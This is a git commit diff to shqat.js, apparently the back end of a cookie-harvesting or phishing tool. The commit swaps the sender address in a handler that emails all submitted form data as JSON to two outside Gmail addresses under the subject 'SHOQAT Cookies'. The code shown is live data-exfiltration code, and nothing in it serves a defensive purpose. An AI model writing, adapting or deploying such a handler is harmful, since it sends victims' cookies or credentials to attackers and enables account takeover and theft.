54bcf2cf5d0e4bf4506a44b85a54f63f64ba3d31
nxnxcmmc-sys <nxnxcmmc@gmail.com>
2025-12-30 09:54:56 +0500

    Update shqat.js

--- shqat.js
+++ shqat.js
@@ -40,7 +40,7 @@ export default async function handler(req, res) {
   try {
     // Try sending email
     await transporter.sendMail({
-      from: `"PROFESSOR" <jsjjjaj671@gmail.com>`,
+      from: `"PROFESSOR" <jaskagz528@gmail.com>`,
       to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com",
       subject: "SHOQAT Cookies",
       text: JSON.stringify(formData, null, 2),
